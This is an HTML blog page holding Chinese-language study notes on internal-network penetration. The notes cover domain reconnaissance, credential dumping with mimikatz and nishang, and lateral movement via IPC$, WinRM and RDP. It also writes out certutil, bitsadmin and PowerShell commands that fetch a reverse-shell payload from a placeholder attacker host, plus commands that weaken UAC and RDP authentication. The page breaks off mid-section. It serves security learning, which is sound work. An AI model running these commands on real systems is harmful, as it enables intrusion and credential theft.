@@ -1,0 +1,1744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="yuBetter">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2023/04/14/内网安全/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="内网安全">
+    <meta property="og:description" content="Hexo Theme Redefine">
+    <meta property="og:url" content="https://example.com2023/04/14/内网安全/">
+    
+    <meta property="og:site_name" content="Yu&#39;s Blog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="内网安全">
+    <meta name="twitter:description" content="Hexo Theme Redefine">
+    <meta name="twitter:image" content="/images/yubetter-logon.svg">
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter-logon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter-logon.svg">
+    <meta name="theme-color" content="#005080">
+    <link rel="shortcut icon" href="/images/yubetter-logon.svg">
+    
+    <title>
+        
+            内网安全 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    
+    
+    
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/yubetter.svg","favicon":"/images/yubetter-logon.svg","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"https://evan.beee.top/img/wallhaven-wqery6-light.webp","dark":"https://evan.beee.top/img/wallhaven-wqery6-dark.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"font_sizes":{"title":"3.5rem","subtitle":"1.5rem"},"line_height":1.2,"title":"好好学习，天天向上","subtitle":{"enable":true,"list":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"]},"custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.1","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}}};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="menu-wrapper">
+    
+    <div class="menu-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="menu-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720211001182136.jpg" alt="内网安全" />
+                    <h1 class="article-title-cover">内网安全</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label">lol</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-04-14 21:31:48</span>
+        <span class="mobile">2023-04-14 21:31</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="pc">2023-04-14 21:33:12</span>
+            <span class="mobile">2023-04-14 21:33</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-file-word"></i>&nbsp;<span>10.8k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>44 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h2 id="基本认知"><a href="#基本认知" class="headerlink" title="基本认知"></a>基本认知</h2><h3 id="网站拓扑"><a href="#网站拓扑" class="headerlink" title="网站拓扑"></a>网站拓扑</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228154128442.png"
+                      alt="image-20230228154128442"
+                ></p>
+<p>一般来说向外部提供服务的服务器存放于DMZ之中（如web服务器），其余较为核心的服务器在内网</p>
+<h3 id="局域网、工作组、域环境"><a href="#局域网、工作组、域环境" class="headerlink" title="局域网、工作组、域环境"></a>局域网、工作组、域环境</h3><p>一般来说工作组和域环境的区别就是规模大小的局域网</p>
+<p>工作组不存在管理主机，域环境存在便于管理，两者的攻击手法不同</p>
+<h4 id="域控制器DC就是所谓的管理主机"><a href="#域控制器DC就是所谓的管理主机" class="headerlink" title="域控制器DC就是所谓的管理主机"></a>域控制器DC就是所谓的管理主机</h4><h4 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h4><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>分为</p>
+<p>单域：只有一个域环境</p>
+<p>父子域：相当于子公司和母公司的区别</p>
+<p>​	注意：linux系统可以是域控制器，但是功能会比win系统少，且难以管理，所以一般来说域控制器都是用win的系统来实现，linux一般用作服务器</p>
+<p>域的组成</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228160643006.png"
+                      alt="image-20230228160643006"
+                ></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>作用：为了了解到当前服务器的计算机的基本信息，为后续判断都武器角色，网络     环境等做准备。</p>
+<p>systeminfo  查看当前已经取得权限主机的详细信息</p>
+<p>net start  查看启动的服务</p>
+<p>tasklist   进程列表</p>
+<p>schtasks 计划任务</p>
+<p>判断是否存在域：</p>
+<p>ipconfig&#x2F;all</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228163534013.png"
+                      alt="image-20230228163534013"
+                ></p>
+<p>net view &#x2F;domain</p>
+<p>判断主域（获取域控的地址）</p>
+<p>net time &#x2F;domain</p>
+<p>判断当前网络端口开放</p>
+<p>netstat -ano</p>
+<p>域名 追踪来源地址</p>
+<p>nslookup</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228164903139.png"
+                      alt="image-20230228164903139"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228165049553.png"
+                      alt="image-20230228165049553"
+                ></p>
+<h3 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h3><p>为了收集各种密文、明文、口令等，为后续的横向渗透做好准备</p>
+<h4 id="mimikatz（适用于win）的使用"><a href="#mimikatz（适用于win）的使用" class="headerlink" title="mimikatz（适用于win）的使用"></a>mimikatz（适用于win）的使用</h4><p>可以使用该工具收集用户的账号和密码信息，但是域用户会有权限限制该工具的使用，这时候就涉及提权操作，如下图</p>
+<p>管理员方式  运行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228225649556.png"
+                      alt="image-20230228225649556"
+                ></p>
+<h4 id="LaZagne（all），XenArmor（win）"><a href="#LaZagne（all），XenArmor（win）" class="headerlink" title="LaZagne（all），XenArmor（win）"></a>LaZagne（all），XenArmor（win）</h4><h4 id="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"><a href="#计算机各种协议服务口令获取（获取本地计算机的各种软件密码）" class="headerlink" title="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"></a>计算机各种协议服务口令获取（获取本地计算机的各种软件密码）</h4><h2 id="后续探针"><a href="#后续探针" class="headerlink" title="后续探针"></a>后续探针</h2><h4 id="探针域控制器及地址信息"><a href="#探针域控制器及地址信息" class="headerlink" title="探针域控制器及地址信息"></a>探针域控制器及地址信息</h4><p>信息收集讲过</p>
+<h4 id="探针域内存活主机及地址信息"><a href="#探针域内存活主机及地址信息" class="headerlink" title="探针域内存活主机及地址信息"></a>探针域内存活主机及地址信息</h4><p> nbtscan 192.168.3.0&#x2F;24 第三方工具，不推荐，可能被杀</p>
+<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”   自带命令探寻主机</p>
+<h5 id="powershell脚本nishang工具"><a href="#powershell脚本nishang工具" class="headerlink" title="powershell脚本nishang工具"></a>powershell脚本nishang工具</h5><p>  —导入模块 nishang：Import-Module .\nishang.psm1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eb5ba3f79d96eb0da2f8ed1d3bdc394277e99a40.png@831w_122h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>#设置执行策略（第一次运行先设置执行策略，这里还是权限不够）</p>
+<p>—Set-ExecutionPolicy RemoteSigned</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9deacbf8ab0e310f7b0d09f0562d35d754dff5e2.png@831w_249h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—以管理员运行powershell，注意这里的密码是DC的密码才行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/18d929307e6e535f289dc3c0c23c6a43b948ddfd.png@831w_335h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—设置执行策略（首次执行nishang）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9cc6070cb110b2453cdb03faef7384e604d67304.png@831w_162h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—导入模块</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/41ad41f293fa81f4ce4bf390c57f341530a7e8a0.png@831w_189h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>#获取模块 nishang 的命令函数</p>
+<p>—Get-Command -Module nishang（每个参数对应一个功能模块）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/65b8cd453110a0bcc587ae3f5c172eadbfcc4a9a.png@831w_243h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—调用Invoke-Mimikatz的功能（查询本地windows账号密码）</p>
+<p>—这里发现了域控（Administrator）的密码、域用户（webadmin）密码和本地管理员用户（Administrator）密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/47773cafd9fafa040b26a7558a9dd85baf3db1fa.png@831w_392h_progressive.webp"
+                      alt="img"
+                ><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/16710e3db0474f31cc7fe2a29a431bb18250f1db.png@698w_299h_progressive.webp"
+                      alt="img"
+                ><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/05194c13133762cdee5b81012974ee3405ce88ab.png@831w_393h_progressive.webp"
+                      alt="img"
+                >![img](<a class="link"   target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp" >https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>#获取常规计算机信息：Get-Information</p>
+<p>—登录用户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—安装的应用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9b52aa996b4c90817f4769d5adb931cc67cc64f6.png@831w_417h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>—启用的服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fd6cee535ee4bd239ea92d167a0bd8597f0e769d.png@725w_216h_progressive.webp"
+                      alt="img"
+                ></p>
+<p> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301132837623.png"
+                      alt="image-20230301132837623"
+                ></p>
+<p>Invoke-Portscan -startAddress 192.168.3.0  -EndAddress 192.168.3.100 -ResolveHost -ScanPort</p>
+<p>Invoke-CredentialsPhish弹出密码登入框，不输对不给关</p>
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h3><h4 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h4><p>Windows的网络共享功能能实现局域网之间的文件共享</p>
+<p>执行net share可以开启网络共享，其中C$是C盘共享，Admin$是目录共享</p>
+<h6 id="IPC-共享"><a href="#IPC-共享" class="headerlink" title="IPC$共享"></a>IPC$共享</h6><p>条件：远程主机开启了ipc连接        139和445端口要开放</p>
+<p>执行</p>
+<p><code>net use \\10.10.10.19\IPC$ &quot;Admin123&quot;  /user :&quot;Administrator&quot;</code>实现IPC连接</p>
+<p><code>dir \\110.10.10.19</code>实现C盘共享目录</p>
+<p><code>copy .\reverse_tcp.exe \\10.10.10.19\C$</code>复制文件到远程主机的C盘</p>
+<p>使用其他的命令也可以达到不同的效果</p>
+<p>如：<code>net use \\10.10.10.19\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</code>建立远程C$共享</p>
+<h4 id="通过搭建SMB服务器"><a href="#通过搭建SMB服务器" class="headerlink" title="通过搭建SMB服务器"></a>通过搭建SMB服务器</h4><p>SMB又称CIFS（网络文件共享系统）</p>
+<p>是计算机能共享文件、打印机、等资源，利用应用层tcp传输，端口139、445偏向445</p>
+<p>可以在服务器中搭建SMB共享服务器，并将攻击载荷放入共享文件夹，使远程主机能够远程加载共享文件（主义使用匿名共享）</p>
+<p>可以利用impacket中的smbserver.py来实现SMB服务器的搭建</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行以下命令即可</span><br><span class="line">mkdir  /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure></div>
+
+<p>对于Windows，已经获得管理员权限的可以直接手动配置一个SMB服务器</p>
+<p>也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享。</p>
+<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>Certutil是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
+<p>执行</p>
+<p><code>certutil -urlcache -split -f http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
+<p>通过Certutil下载shell.exe，并保存在C:\reverse_tcp.exe</p>
+<h6 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h6><p>Bitsadmin是一个命令行工具可以用来创建、下载、上载作业，监视进度</p>
+<p><code>bitsadmin \transfer test http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
+<p>创建一个名为test的Bitsadmin任务，保存shell.exe到C:\reverse_tcp.exe</p>
+<h6 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h6><p>可以利用WebClient来实现文件下载</p>
+<p><code>(New-Object Net.WebClient).DownloadFile(&#39;http://你的IP:端口port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
+<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p>UAC是用户账户控制，这使计算机能以非管理员模式运行，本地中如何非RID 500的其他用户都以最小权限运行。</p>
+<p>为了更好的保护属于本地管理员成员的用户，微软在Windows vista之后引入UAC Remote Restrictions远程限制</p>
+<p>这个东西会导致schtasks、PsExec、WMI、WinRM、哈希传递攻击都只能使用RID 500的本地管理员用户，其他用户包括非RID 500的本地管理员用户都会提示“拒绝访问”</p>
+<p>从而限制横向移动</p>
+<p>关闭</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h3><p>查询是否开启远程桌面</p>
+<p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections</code></p>
+<p>0没启动 1启动</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#本地开启远程桌面功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server\WinStations\RDP-TCP&quot; /v UserAuthentication /t REG_Dword /d 0</span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">#对于远程主机可以使用WMI来开启远程桌面</span><br><span class="line">wmic /Node:10.10.10.19 /User:Administrator /Pssword:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h6><p>原理是，当有多个用户使用远程桌面时，就会产生多个RDP会话，并且可以在未授权的情况下成功登入目标系统，即使用户会话已经断开</p>
+<p>需要获取SYSTEM权限，正常来说需要密码，但是已经获取了 SYSTEM权限就可以不用密码</p>
+<p>操作：在Meterpreter中提权至SYSTEM权限后执行<code>tscon 9</code>即可</p>
+<h6 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h6><p>SharpRDP是一款开源工具，需要3389端口，可以在远程主机上执行系统命令，不需要GUI</p>
+<p>可以直接将SharpRDP上传到跳板机。然后获取用户凭据，对内网其他主机执行系统命令，就省去代理等中间环节</p>
+<h3 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h3><h4 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h4><p>有两个命令工具：</p>
+<p>1.Winrs远程执行命令 </p>
+<p>远程管理的客户端程序，提供凭据即可运行，但需要双方都有winrm服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行以下命令，可以执行以下命令</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class="line">可以通过这个开启目标的cmd</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>2.Winrm（.cmd）系统管理命令行工具</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过调用Win32_Process类中的Create方法来创建远程进程</span><br><span class="line">实战中可以执行一个攻击载荷</span><br><span class="line">winem invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="利用WinRM获取交互式会话"><a href="#利用WinRM获取交互式会话" class="headerlink" title="利用WinRM获取交互式会话"></a>利用WinRM获取交互式会话</h4><h6 id="powershell利用"><a href="#powershell利用" class="headerlink" title="powershell利用"></a>powershell利用</h6><p>powershell的远程传输协议基于WinRM规范，且可以远程管理</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Get-PSSession</code>查看当前已经创建的PSSession会话</p>
+<p>选中一个会话并且执行<code>Enter-PSSession -Name WinRM1</code>进入会话交互模式</p>
+<p>也可以通过Invoke-Command执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">$Sess = New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br><span class="line">在创建的会话中执行命令</span><br><span class="line">Invoke-Command -Session $Sess -ScriptBlock &#123; dir c:\&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="Evil-Winrm"><a href="#Evil-Winrm" class="headerlink" title="Evil-Winrm"></a>Evil-Winrm</h6><p>Evil-winrm是一种基于Winrm Shell的渗透架构，可以通过提供用户名密码和哈希值在启用了WinRM服务的目标主机上完成的简单的攻击任务</p>
+<h4 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h4><h5 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h5><p>在拿下一台内网主机之后，通过本地信息收集用户凭证信息之后，应该如何很横向渗透拿下更多的主机，这里就涉及到at&amp;schtasks命令的使用，在一直目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令</p>
+<p>主要步骤：获取到某域主机权限-&gt;mimikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表做字典 -&gt;用到密码明文当作密码字典-&gt;尝试连接–&gt;穿甲计划任务（at&amp;schtasks）-&gt;执行文件可为后门或者相关命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
